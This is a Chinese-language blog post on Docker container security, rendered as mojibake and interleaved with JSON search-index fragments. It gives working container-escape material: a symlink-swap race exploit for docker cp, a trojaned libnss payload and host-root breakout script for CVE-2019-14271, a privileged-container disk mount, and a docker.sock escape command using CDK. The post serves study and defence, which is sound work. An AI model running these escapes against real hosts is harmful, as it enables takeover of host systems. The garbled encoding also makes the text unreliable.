ç›®å½•åŒ…å«äº†ç”¨æ¥ç¼–è¯‘ EXP çš„ Dockerfile å’Œæ¼æ´åˆ©ç”¨æºä»£ç  symlink_swap.c æ³¨æ„ æ„å»ºé•œåƒæ—¶ï¼Œåœ¨å®¹å™¨å†…å®‰è£… gcc æ—¶æŠ¥é”™ï¼Œå¯ä»¥å…ˆåœ¨å®¿ä¸»æœºå°† symlink_swap ç¼–è¯‘å¥½ï¼Œå† COPY åˆ°å®¹å™¨ä¸­ã€‚ ä¿®æ”¹åçš„ Dockerfileï¼š # Build the binary. FROM opensuse/tumbleweed # RUN zypper in -y gcc glibc-devel-static RUN mkdir /builddir COPY symlink_swap.c /builddir/symlink_swap.c # RUN gcc -Wall -Werror -static -lpthread -o /builddir/symlink_swap /builddir/symlink_swap.c COPY symlink_swap /builddir/symlink_swap # Set up our malicious rootfs. FROM opensuse/tumbleweed ARG SYMSWAP_TARGET=/w00t_w00t_im_a_flag ARG SYMSWAP_PATH=/totally_safe_path RUN echo \"FAILED -- INSIDE CONTAINER PATH\" \u003e\"$SYMSWAP_TARGET\" COPY --from=0 /builddir/symlink_swap /symlink_swap ENTRYPOINT [\"/symlink_swap\"] Dockerfile çš„ä¸»è¦å†…å®¹æ˜¯æ„å»ºæ¼æ´åˆ©ç”¨ç¨‹åºï¼Œå¹¶å°†å…¶æ”¾åœ¨å®¹å™¨çš„æ ¹ç›®å½•ä¸‹ï¼Œå¹¶åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª w00t_w00t_im_a_flag æ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼šFAILED -- INSIDE CONTAINER PATHã€‚å®¹å™¨å¯åŠ¨åæ‰§è¡Œçš„ç¨‹åº(Entrypoint) å³ä¸ºï¼šsymlink_swapã€‚ Symlink_swap.c å†…å®¹ï¼š /* * Now create a symlink to \"/\" (which will resolve to the host's root if we * win the race) and a dummy directory at stash_path for us to swap with. * We use a directory to remove the possibility of ENOTDIR which reduces * the chance of us winning. */ if (symlink(\"/\", symlink_path) \u003c 0) bail(\"create symlink_path\"); if (mkdir(stash_path, 0755) \u003c 0) bail(\"mkdir stash_path\"); /* Now we do a RENAME_EXCHANGE forever. */ for (;;) { int err = rrenameat2(AT_FDCWD, symlink_path, AT_FDCWD, stash_path, RENAME_EXCHANGE); if (err \u003c 0) perror(\"symlink_swap: rename exchange failed\"); } return 0; } åœ¨å®¹å™¨å†…åˆ›å»ºæŒ‡å‘æ ¹ç›®å½•çš„ç¬¦å·é“¾æ¥ï¼Œå¹¶ä¸æ–­åœ°äº¤æ¢ç¬¦å·é“¾æ¥(ç”±å‘½ä»¤è¡Œå‚æ•°ä¼ å…¥ï¼Œå¦‚ã€Œtotaly_safe_pathã€)ä¸ä¸€ä¸ªæ­£å¸¸çš„ç›®å½•(å¦‚ï¼šã€Œtotaly_safe_path-stashedã€)çš„åå­—ã€‚ run_read.sh : å®ç°è¯»å–å®¿ä¸»æœºæ–‡ä»¶å†…å®¹çš„ shell è„šæœ¬ run_write.sh : å®ç°åœ¨å®¿ä¸»æœºå†™æ–‡ä»¶çš„ shell è„šæœ¬ ä»¥ run_write.sh ä¸ºä¾‹ï¼š SYMSWAP_PATH=/totally_safe_path SYMSWAP_TARGET=/w00t_w00t_im_a_flag # Create our flag. echo \"FAILED -- HOST FILE UNCHANGED\" | sudo tee \"$SYMSWAP_TARGET\" sudo chmod 0444 \"$SYMSWAP_TARGET\" # Run and build the malicious image. docker build -t cyphar/symlink_swap \\ --build-arg \"SYMSWAP_PATH=$SYMSWAP_PATH\" \\ --build-arg \"SYMSWAP_TARGET=$SYMSWAP_TARGET\" build/ ctr_id=$(docker run --rm -d cyphar/symlink_swap \"$SYMSWAP_PATH\") echo \"SUCCESS -- HOST FILE CHANGED\" | tee localpath # Now continually try to copy the files. while true do docker cp localpath \"${ctr_id}:$SYMSWAP_PATH/$SYMSWAP_TARGET\" done run_write.sh å¯åŠ¨åæ¶æ„å®¹å™¨è¿è¡Œï¼Œç„¶åä¸æ–­æ‰§è¡Œ docker cp å‘½ä»¤ ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:1:2","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.3 CVE-2019-14271 å½±å“ Docker 19.03.x before 19.03.1 1.3.1 åŸç† docker cp å‘½ä»¤ä¾èµ–çš„ docker-tar ç»„ä»¶ä¼šåŠ è½½å®¹å™¨å†…éƒ¨çš„ nsswitch åŠ¨æ€é“¾æ¥åº“ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åŠ«æŒå®¹å™¨å†…éƒ¨çš„ nsswitch æ¥å®ç°ä»£ç çš„æ³¨å…¥ï¼Œè·å¾—å®¿ä¸»æœºä¸Šçš„ root æƒé™çš„ä»£ç æ‰§è¡Œèƒ½åŠ›ã€‚ ç”¨æˆ·åœ¨æ‰§è¡Œ docker cp åï¼ŒDocker å®ˆæŠ¤è¿›ç¨‹å¯åŠ¨ docker-tar è¿›ç¨‹æ¥å®Œæˆå¤åˆ¶ã€‚ä»¥ã€Œä»å®¹å™¨å†…æ–‡ä»¶å¤åˆ¶åˆ°å®¿ä¸»æœºä¸ºä¾‹ã€ï¼Œå®ƒä¼šåˆ‡æ¢è¿›ç¨‹çš„æ ¹ç›®å½•(æ‰§è¡Œ chroot)åˆ°å®¹å™¨æ ¹ç›®å½•ï¼Œå°†éœ€è¦å¤åˆ¶çš„æ–‡ä»¶æ‰“åŒ…ï¼Œç„¶åä¼ é€’ç»™ Docker å®ˆæŠ¤è¿›ç¨‹ï¼ŒDocker å®ˆæŠ¤è¿›ç¨‹è´Ÿè´£å°†å†…å®¹è§£æåˆ°ç”¨æˆ·æŒ‡å®šçš„å®¿ä¸»æœºç›®æ ‡è·¯å¾„ã€‚ chroot çš„æ“ä½œä¸»è¦æ˜¯ä¸ºäº†é¿å…ç¬¦å·é“¾æ¥å¯¼è‡´çš„è·¯å¾„ç©¿è¶Šé—®é¢˜ï¼Œä½†å­˜åœ¨æ¼æ´ç‰ˆæœ¬çš„ docker-tar ä¼šåŠ è½½å¿…è¦çš„åŠ¨æ€é“¾æ¥åº“ï¼Œä¸»è¦ä»¥ libness_ å¼€å¤´çš„ nsswitch åŠ¨æ€é“¾æ¥åº“ã€‚chroot åˆ‡æ¢æ ¹ç›®å½•åï¼Œdocker-tar å°†åŠ è½½å®¹å™¨å†…éƒ¨çš„åŠ¨æ€é“¾æ¥åº“ã€‚ æ¼æ´åˆ©ç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š æ‰¾å‡º docker-tar å…·ä½“ä¼šåŠ è½½å“ªäº›å®¹å™¨å†…çš„åŠ¨æ€é“¾æ¥åº“ã€‚ ä¸‹è½½å¯¹åº”çš„åŠ¨æ€é“¾æ¥åº“æºç ï¼Œå¢åŠ  __attribute__ å±æ€§çš„å‡½æ•° run_at_link(è¯¥å‡½æ•°åœ¨åŠ¨æ€é“¾æ¥åº“è¢«åŠ è½½æ—¶é¦–å…ˆæ‰§è¡Œ) ç­‰å¾… docker cp è§¦å‘æ¼æ´ 1.3.2 æ¼æ´å¤ç° 1.3.2.1 ç¡®å®šç›®æ ‡ ç¡®å®š docker cp æ‰§è¡Œä¸­ç”¨åˆ°å“ªäº›å®¹å™¨å†…çš„åŠ¨æ€é“¾æ¥åº“ã€‚ åœ¨å­˜åœ¨æ¼æ´çš„ Docker ç¯å¢ƒä¸­ï¼Œåˆ›å»ºå®¹å™¨ï¼š docker run -itd --name=test ubuntu å¯»æ‰¾å®¹å™¨åœ¨å®¿ä¸»æœºä¸Šçš„ç»å¯¹è·¯å¾„ï¼š docker exec -it test cat /proc/mounts | grep docker è¿”å›ç»“æœåŒ…å«ï¼š workdir=/var/lib/docker/overlay2/42549fa40947a72bc4f3ae8b8676297d774d4fe2f8afb7122717548b06861d85/work å®¹å™¨åœ¨å®¿ä¸»æœºä¸Šçš„ç»å¯¹è·¯å¾„å³ä¸ºï¼š/var/lib/docker/overlay2/42549fa40947a72bc4f3ae8b8676297d774d4fe2f8afb7122717548b06861d85/merged å®‰è£…ç›‘æ§æ–‡ä»¶ï¼š apt install inotify-tools ç›‘æ§æ–‡ä»¶å¤¹ï¼š inotifywait -mr /var/lib/docker/overlay2/42549fa40947a72bc4f3ae8b8676297d774d4fe2f8afb7122717548b06861d85/merged/lib æ‰§è¡Œ docker cp docker cp test:/etc/passwd ./ å¯ä»¥çœ‹åˆ°åŠ è½½äº† libnss_files-2.31.so 1.3.2.2 æ„å»ºåŠ¨æ€é“¾æ¥åº“ libnss_*.so å‡åœ¨ Glibc ä¸­ï¼Œé¦–å…ˆä¸‹è½½ Glibc åº“åˆ°æœ¬åœ°ã€‚ é¦–å…ˆè¦æ³¨é‡Šæ‰ gccwarn-c = -Wstrict-prototypes -Wold-style-definitionï¼Œé¿å…åŠ å…¥ payload åç¼–è¯‘å¤±è´¥ã€‚ åœ¨ ./nss/nss_files ç›®å½•ä¸‹ä»»æ„æºç æ–‡ä»¶ä¸­æ·»åŠ  payloadã€‚ä»¥ files-service.c ä¸ºä¾‹ã€‚ // content should be added into nss/nss_files/files-service.c #include \u003csys/types.h\u003e #include \u003cunistd.h\u003e #include \u003cstdio.h\u003e #include \u003csys/wait.h\u003e # å®¹å™¨å†…éƒ¨åŸå§‹ libnss_files.so.2 æ–‡ä»¶å¤‡ä»½ä½ç½® #define ORIGINAL_LIBNSS \"/original_libnss_files.so.2\" # æ¶æ„ libnss_files.so.2 æ–‡ä»¶ä½ç½® #define LIBNSS_PATH \"/lib/x86_64-linux-gnu/libnss_files.so.2\" bool is_priviliged(); __attribute__ ((constructor)) void run_at_link(void) { char * argv_break[2]; // åˆ¤æ–­æ˜¯å¦å®¹å™¨å¤–æ˜¯é«˜æƒé™æ‰§è¡Œï¼Œå³ docker-tar if (!is_priviliged()) return; // æ”»å‡»æ‰§è¡Œä¸€æ¬¡å³å¯ï¼Œç”¨åŸå§‹çš„æ›¿æ¢å¤‡ä»½çš„åº“æ–‡ä»¶ // é¿å…åç»­å¯¹ç¯å¢ƒäº§ç”Ÿå½±å“ rename(ORIGINAL_LIBNSS, LIBNSS_PATH); // ä»¥ docker-tar è¿è¡Œ /breakout æ¶æ„è„šæœ¬ if (!fork()) { // Child runs breakout argv_break[0] = strdup(\"/breakout\"); argv_break[1] = NULL; execve(\"/breakout\", argv_break, NULL); } else wait(NULL); // Wait for child return; } bool is_priviliged() { FILE * proc_file = fopen(\"/proc/self/exe\", \"r\"); if (proc_file != NULL) { fclose(proc_file); return false; // can open so /proc exists, not privileged } return true; // we're running in the context of docker-tar } ç¼–è¯‘ï¼š # ç›®å½•ç»“æ„ï¼š - gnu - glibc-2.27 - glibc-build # å®‰è£… bison apt install bison # æ–°å»º glibc-build ç›®å½• mkdir glibc-build # è¦åˆ°ä¸Šçº§ç›®å½•è¿›è¡Œ configï¼Œä¸ç„¶ä¼šæŠ¥é”™ ./glibc-2.27/glibc-build/configure --prefix=/usr/ # ç¼–è¯‘ ~/glibc-2.27/glibc-build make 1.3.2.3 é€ƒé€¸ breakout æ–‡ä»¶ï¼š å°† procfs ä¼ªæ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°å®¹å™¨å†…ï¼Œå°† PID ä¸º 1 çš„æ ¹ç›®å½• /proc/1/root ç»‘å®šæŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨å³å¯ã€‚ #!/bin/bash umount /host_fs \u0026\u0026 rm -rf /host_fs mkdir /host_fs mount -t proc none /proc # mount the host's procfs over /proc cd /proc/1/root # chdir to host's root mount --bind . /host_fs # mount host root at /host_fs é¦–å…ˆåˆ›å»º victim å®¹å™¨ï¼š docker run -itd --name=victim ubuntu å°† breakout è„šæœ¬æ”¾åˆ° victim å®¹å™¨æ ¹ç›®å½•ã€‚ docker cp ./breakout victim:/breakout è¿›å…¥å®¹å™¨ï¼Œå†å°† /lib/x86_64-linux-gnu ä¸‹çš„ libnss_files.so.2 ç¬¦å·é“¾æ¥æŒ‡å‘åº“æ–‡ä»¶ç§»åŠ¨åˆ°å®¹å™¨æ ¹ç›®å½•ä¸‹å¹¶é‡å‘½åä¸º original_libnss_files.so.2ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ï¼š readlink /lib/x86_64-linux-gnu/libnss_files.so.2 mv /lib/x86_64-linux-gnu/libnss_files.so.2 /original_libnss_files.so.2 æœ€åå°†æ„å»ºå¥½çš„æ¶æ„ libnss_files.so é‡å‘½åä¸º libnss_files.so.2ï¼Œæ”¾åˆ°å®¹å™¨å†… /lib/x86_64-linux-gnu ä¸‹ã€‚ æ¨¡æ‹Ÿç”¨æˆ·æ‰§è¡Œ docker cp æ“ä½œï¼š docker cp victim:/etc/passwd ./ æ‰§è¡Œåï¼Œæ¼æ´è¢«è§¦å‘ï¼Œå®¹å™¨å†…éƒ¨å·²ç»èƒ½çœ‹åˆ°æŒ‚è½½çš„ /host_fsï¼Œå…¶ä¸­çš„ /etc/hostname æ˜¾ç¤ºçš„å³ä¸ºå®¿ä¸»æœºçš„ hostnameã€‚ ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:1:3","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2 é’ˆå¯¹å®¹å™¨è½¯ä»¶ä¾›åº”é“¾çš„æ”»å‡»æ¡ˆä¾‹ ä»ç”¨æˆ·è§’åº¦æ¥çœ‹ï¼Œå®¹å™¨é•œåƒåœ¨è·å–é€”å¾„ä¸Šï¼Œæˆ‘ä»¬å°†å…¶åˆ†ä¸ºâ€œä»å…¬å…±ä»“åº“è·å–â€ä»¥åŠâ€œä»ç§æœ‰ä»“åº“è·å–â€ä¸¤ç§ï¼Œé‚£ä¹ˆå¯¹äºä»å…¬å…±ä»“åº“è·å–çš„é•œåƒï¼Œæœ€é‡è¦çš„ä¸¤ä¸ªè„†å¼±æ€§é—®é¢˜ï¼šä¸€æ–¹é¢æ˜¯é•œåƒä¸­è½¯ä»¶çš„å®‰å…¨æ¼æ´é—®é¢˜ï¼›å¦ä¸€æ–¹é¢æ˜¯é•œåƒå†…çš„æŒ–çŸ¿ç¨‹åºã€åé—¨ç¨‹åºã€ç—…æ¯’ã€æœ¨é©¬ç­‰æ¶æ„ç¨‹åºã€‚ ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:2:0","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2.1 é•œåƒæ¼æ´åˆ©ç”¨ é•œåƒæ¼æ´åˆ©ç”¨æŒ‡çš„æ˜¯é•œåƒæœ¬èº«å­˜åœ¨æ¼æ´æ—¶ï¼Œä½¿ç”¨é•œåƒåˆ›å»ºå¹¶è¿è¡Œçš„å®¹å™¨ä¹Ÿé€šå¸¸ä¼šå­˜åœ¨ ç›¸åŒæ¼æ´ï¼Œæ”»å‡»è€…åˆ©ç”¨é•œåƒä¸­å­˜åœ¨çš„æ¼æ´å»æ”»å‡»å®¹å™¨ï¼Œå¾€å¾€å…·æœ‰äº‹åŠåŠŸå€çš„æ•ˆæœã€‚ ä¾‹å¦‚ï¼ŒAlpine æ˜¯ä¸€ä¸ªè½»é‡åŒ–çš„ Linux å‘è¡Œç‰ˆï¼ŒåŸºäº musl libc å’Œ busybox æ„å»ºè€Œæˆã€‚ç”± äºå…¶ä½“ç§¯è¾ƒå°ï¼Œå› æ­¤ä»¥ Alpine ä¸ºåŸºç¡€é•œåƒæ„å»ºè½¯ä»¶æ˜¯éå¸¸æµè¡Œçš„ã€‚ä½† Alpine é•œåƒæ›¾æ›å‡ºä¸€ä¸ªæ¼æ´ï¼šCVE-2019-5021ã€‚åœ¨ 3.3 ~ 3.9 ç‰ˆæœ¬çš„ Alpine é•œåƒä¸­ï¼Œroot ç”¨æˆ·å¯†ç è¢«è®¾ç½®ä¸ºç©ºï¼Œæ”»å‡»è€…å¯èƒ½åœ¨æ”»å…¥å®¹å™¨åå€Ÿæ­¤æå‡åˆ°å®¹å™¨å†…éƒ¨ root æƒé™ã€‚ å®˜æ–¹å¯¹æ­¤çš„å›åº”æ˜¯ï¼ŒAlpine é•œåƒä½¿ç”¨ busybox ä½œä¸ºæ ¸å¿ƒå·¥å…·é“¾ï¼Œé€šè¿‡ /etc/security é™åˆ¶äº†å¯ä»¥ç™»å…¥ root ç”¨æˆ·çš„ tty è®¾å¤‡ã€‚é™¤éæ˜¯ç”¨æˆ·ä¸»åŠ¨å®‰è£… shadow å’Œ linux-pam æ¥ä»£æ›¿é»˜è®¤å·¥å…·é“¾ï¼Œå¦åˆ™è¿™ä¸ªæ¼æ´å¹¶ä¸å¥½åˆ©ç”¨ã€‚ ä½†æ˜¯ï¼Œå®‰å…¨é˜²æŠ¤æ³¨é‡å…¨é¢æ€§ï¼Œå…·æœ‰æ˜æ˜¾çš„çŸ­æ¿æ•ˆåº”ã€‚å‡å¦‚ç”¨æˆ·çœŸçš„å‡ºäºæŸç§éœ€æ±‚æ›¿æ¢äº†é»˜è®¤å·¥å…·é“¾å‘¢ï¼Ÿé‚£ä¹ˆè¿›å…¥å®¹å™¨çš„æ”»å‡»è€…å€ŸåŠ©æ­¤æ¼æ´å°±èƒ½ç›´æ¥è·å¾—å®¹å™¨å†…éƒ¨ root æƒé™äº†ã€‚ FORM alpine:3.5 RUN apk add --no-cache shadow RUN adduser -S non_root USER non_root ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:2:1","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"2.2 é•œåƒæŠ•æ¯’ é•œåƒæŠ•æ¯’æ˜¯ä¸€ä¸ªå®½æ³›çš„è¯é¢˜ã€‚å®ƒæŒ‡çš„æ˜¯æ”»å‡»è€…é€šè¿‡æŸäº›æ–¹å¼ï¼Œå¦‚ä¸Šä¼ æ¶æ„é•œåƒåˆ°å…¬å¼€ ä»“åº“ã€å…¥ä¾µç³»ç»Ÿåä¸Šä¼ é•œåƒåˆ°å—å®³è€…æœ¬åœ°ä»“åº“ï¼Œä»¥åŠä¿®æ”¹é•œåƒåç§°å¹¶å‡å†’æ­£å¸¸é•œåƒç­‰ï¼Œæ¬ºéª—ã€è¯±å¯¼å—å®³è€…ä½¿ç”¨æ”»å‡»è€…æŒ‡å®šçš„æ¶æ„é•œåƒåˆ›å»ºå¹¶è¿è¡Œå®¹å™¨ï¼Œä»è€Œå®ç°å…¥ä¾µæˆ–åˆ©ç”¨å—å®³è€…çš„ä¸»æœºè¿›è¡Œæ¶æ„æ´»åŠ¨çš„è¡Œä¸ºã€‚ æ ¹æ®ç›®çš„ä¸åŒï¼Œå¸¸è§çš„é•œåƒæŠ•æ¯’æœ‰ä¸‰ç§ç±»å‹ï¼šæŠ•æ”¾æ¶æ„æŒ–çŸ¿é•œåƒã€æŠ•æ”¾æ¶æ„åé—¨é•œåƒå’ŒæŠ•æ”¾æ¶æ„ exploit é•œåƒ ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:2:2","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3 é’ˆå¯¹å®¹å™¨è¿è¡Œæ—¶çš„æ”»å‡» ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:0","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3.1 ä¸å®‰å…¨é…ç½®å¯¼è‡´çš„å®¹å™¨é€ƒé€¸ Docker å·²ç»å°†å®¹å™¨è¿è¡Œæ—¶çš„ Capabilities é»‘åå•æœºåˆ¶æ”¹ä¸ºå¦‚ä»Šçš„é»˜è®¤ç¦æ­¢æ‰€æœ‰ Capabilitiesï¼Œå†ä»¥ç™½åå•æ–¹å¼èµ‹äºˆå®¹å™¨è¿è¡Œæ‰€éœ€çš„æœ€å°æƒé™ã€‚æˆªæ­¢æœ¬æ–‡æˆç¨¿æ—¶ï¼ŒDocker é»˜è®¤èµ‹äºˆå®¹å™¨è¿‘ 40 é¡¹æƒé™ä¸­çš„ 14 é¡¹ï¼š func DefaultCapabilities() []string { return []string{ \"CAP_CHOWN\", \"CAP_DAC_OVERRIDE\", \"CAP_FSETID\", \"CAP_FOWNER\", \"CAP_MKNOD\", \"CAP_NET_RAW\", \"CAP_SETGID\", \"CAP_SETUID\", \"CAP_SETFCAP\", \"CAP_SETPCAP\", \"CAP_NET_BIND_SERVICE\", \"CAP_SYS_CHROOT\", \"CAP_KILL\", \"CAP_AUDIT_WRITE\", } } æ— è®ºæ˜¯ç»†ç²’åº¦æƒé™æ§åˆ¶è¿˜æ˜¯å…¶ä»–å®‰å…¨æœºåˆ¶ï¼Œç”¨æˆ·éƒ½å¯ä»¥é€šè¿‡ä¿®æ”¹å®¹å™¨ç¯å¢ƒé…ç½®æˆ–åœ¨è¿è¡Œå®¹å™¨æ—¶æŒ‡å®šå‚æ•°æ¥ç¼©å°æˆ–æ‰©å¤§çº¦æŸã€‚å¦‚æœç”¨æˆ·ä¸ºä¸å®Œå…¨å—æ§çš„å®¹å™¨æä¾›äº†æŸäº›å±é™©çš„é…ç½®å‚æ•°ï¼Œå°±ä¸ºæ”»å‡»è€…æä¾›äº†ä¸€å®šç¨‹åº¦çš„é€ƒé€¸å¯èƒ½æ€§ã€‚ 3.1.1 privileged ç‰¹æƒæ¨¡å¼è¿è¡Œå®¹å™¨ å½“æ“ä½œè€…æ‰§è¡Œ docker run --privileged æ—¶ï¼ŒDocker å°†å…è®¸å®¹å™¨è®¿é—®å®¿ä¸»æœºä¸Šçš„æ‰€æœ‰è®¾å¤‡ï¼ŒåŒæ—¶ä¿®æ”¹ AppArmor æˆ– SELinux çš„é…ç½®ï¼Œä½¿å®¹å™¨æ‹¥æœ‰ä¸é‚£äº›ç›´æ¥è¿è¡Œåœ¨å®¿ä¸»æœºä¸Šçš„è¿›ç¨‹å‡ ä¹ç›¸åŒçš„è®¿é—®æƒé™ã€‚ ä»¥ç‰¹æƒæ¨¡å¼å’Œéç‰¹æƒæ¨¡å¼åˆ›å»ºäº†ä¸¤ä¸ªå®¹å™¨ï¼Œå…¶ä¸­ç‰¹æƒå®¹å™¨å†…éƒ¨å¯ä»¥çœ‹åˆ°å®¿ä¸»æœºä¸Šçš„è®¾å¤‡ï¼š æ”»å‡»è€…å¯ä»¥ç›´æ¥åœ¨å®¹å™¨å†…éƒ¨æŒ‚è½½å®¿ä¸»æœºç£ç›˜ï¼Œç„¶åå°†æ ¹ç›®å½•åˆ‡æ¢è¿‡å»ï¼š mkdir host mount /dev/sda /host ","date":"2021-11-10","objectID":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/:3:1","tags":["äº‘åŸç”Ÿå®‰å…¨","docker"],"title":"å®¹å™¨å®‰å…¨","uri":"/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"3.2 å±é™©æŒ‚è½½å¯¼è‡´çš„å®¹å™¨é€ƒé€¸ ä¸ºäº†æ–¹ä¾¿å®¿ä¸»æœºä¸è™šæ‹Ÿæœºè¿›è¡Œæ•°æ®äº¤æ¢ï¼Œè™šæ‹ŸåŒ–è§£å†³æ–¹æ¡ˆéƒ½ä¼šæä¾›æŒ‚è½½å®¿ä¸»æœºç›®å½•åˆ°è™šæ‹Ÿæœºçš„åŠŸèƒ½ã€‚å®¹å™¨åŒæ ·å¦‚æ­¤ã€‚ç„¶è€Œï¼Œå°†å®¿ä¸»æœºä¸Šçš„æ•æ„Ÿæ–‡ä»¶æˆ–ç›®å½•æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ - å½“å—æ§å®¹å™¨å­˜åœ¨ä¸å®‰å…¨çš„æŒ‚è½½æ—¶ï¼Œä¼šé€ æˆä¸¥é‡çš„é—®é¢˜ã€‚ 3.2.1 æŒ‚è½½ Docker Socket çš„æƒ…å†µ Docker Socket æ˜¯ Docker å®ˆæŠ¤è¿›ç¨‹ç›‘å¬çš„ Unix åŸŸå¥—æ¥å­—ï¼Œç”¨æ¥ä¸å®ˆæŠ¤è¿›ç¨‹é€šä¿¡ - æŸ¥è¯¢ä¿¡æ¯æˆ–ä¸‹å‘å‘½ä»¤ã€‚å¦‚æœåœ¨æ”»å‡»è€…å¯æ§çš„å®¹å™¨å†…æŒ‚è½½äº†è¯¥å¥—æ¥å­—æ–‡ä»¶ï¼ˆ/var/run/docker.sockï¼‰ï¼Œå®¹å™¨é€ƒé€¸å°±ç›¸å½“å®¹æ˜“äº†ï¼Œé™¤éæœ‰è¿›ä¸€æ­¥çš„æƒé™é™åˆ¶ã€‚ å¤ç°è¿‡ç¨‹ï¼š é¦–å…ˆåˆ›å»ºä¸€ä¸ªå®¹å™¨å¹¶æŒ‚è½½ /var/run/docker.sockï¼› åœ¨è¯¥å®¹å™¨å†…å®‰è£… Docker å‘½ä»¤è¡Œå®¢æˆ·ç«¯ï¼› æ¥ç€ä½¿ç”¨è¯¥å®¢æˆ·ç«¯é€šè¿‡ Docker Socket ä¸ Docker å®ˆæŠ¤è¿›ç¨‹é€šä¿¡ï¼Œå‘é€å‘½ä»¤åˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œå°†å®¿ä¸»æœºçš„æ ¹ç›®å½•æŒ‚è½½åˆ°æ–°åˆ›å»ºçš„å®¹å™¨å†…éƒ¨ï¼› åœ¨æ–°å®¹å™¨å†…æ‰§è¡Œ chroot å°†æ ¹ç›®å½•åˆ‡æ¢åˆ°æŒ‚è½½çš„å®¿ä¸»æœºæ ¹ç›®å½•ã€‚ docker run -itd --name demo -v /var/run/docker.sock:/var/run/docker.sock ubuntu åˆ©ç”¨ CDK è¿›è¡Œè¿›è¡Œæ£€æŸ¥ï¼š ./cdk run docker-sock-check /var/run/docker.sock å‘½ä»¤æ‰§è¡Œï¼ˆé€ƒé€¸ï¼‰ï¼š ./cdk run docker-sock-pwn \u003csock_path\u003e \u003cshell_cmd\u003e ./cdk run docker-sock-pwn /var/run/docker.sock \"touch /host/tmp/pwn-success\" 3.2.2 æŒ‚è½½ä¸»æœº procfs çš„æƒ…å†µ procfs æ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒåŠ¨æ€åæ˜ ç€ç³»ç»Ÿå†…è¿›ç¨‹åŠå…¶ä»–ç»„ä»¶çš„çŠ¶æ€ï¼Œå…¶ä¸­æœ‰è®¸å¤šååˆ†æ•æ„Ÿé‡è¦çš„æ–‡ä»¶ã€‚å› æ­¤ï¼Œå°†å®¿ä¸»æœºçš„ procfs æŒ‚è½½åˆ°ä¸å—æ§çš„å®¹å™¨ä¸­ä¹Ÿæ˜¯ååˆ†å±é™©çš„ï¼Œå°¤å…¶æ˜¯åœ¨è¯¥å®¹å™¨å†…é»˜è®¤å¯ç”¨ root æƒé™ï¼Œä¸”æ²¡æœ‰å¼€å¯ User Namespace æ—¶ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ä¸ä¼šå°†å®¿ä¸»æœºçš„procfsæŒ‚è½½åˆ°å®¹å™¨ä¸­ã€‚ç„¶è€Œï¼Œæœ‰äº›ä¸šåŠ¡ä¸ºäº†å®ç°æŸäº›ç‰¹æ®Šéœ€è¦ï¼Œè¿˜æ˜¯ä¼šå°†è¯¥æ–‡ä»¶ç³»ç»ŸæŒ‚è½½è¿›æ¥ã€‚ procfs ä¸­çš„ /proc/sys/kernel/core_pattern è´Ÿè´£é…ç½®è¿›ç¨‹å´©æºƒæ—¶å†…å­˜è½¬å‚¨æ•°æ®çš„å¯¼å‡ºæ–¹å¼ã€‚ä»æ‰‹å†Œä¸­èƒ½è·å¾—å…³äºå†…å­˜è½¬å‚¨çš„è¯¦ç»†ä¿¡æ¯ï¼Œå…³é”®ä¿¡æ¯å¦‚ä¸‹ï¼š ä» 2.6.19 å†…æ ¸ç‰ˆæœ¬å¼€å§‹ï¼ŒLinux 